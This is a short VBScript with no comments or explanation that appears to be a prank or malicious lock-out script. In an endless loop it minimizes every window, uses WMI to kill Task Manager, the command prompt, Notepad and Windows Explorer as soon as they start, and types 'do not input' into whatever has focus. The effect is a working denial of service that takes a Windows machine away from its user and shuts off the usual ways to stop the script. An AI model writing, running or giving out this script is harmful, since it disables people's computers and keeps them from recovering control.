set ws=createobject("wscript.shell") 
do
CreateObject("shell.Application").MinimizeAll
wscript.sleep 200
CreateObject("shell.Application").MinimizeAll
wscript.sleep 200
For Each a in GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")
If a.name = "Taskmgr.exe" then
a.Terminate()
elseif a.name = "cmd.exe" then
a.Terminate()
elseif a.name = "notepad.exe" then
a.Terminate()
elseif a.name = "explorer.exe" then
a.Terminate()
End if
next
ws.sendKeys "do not input"
loop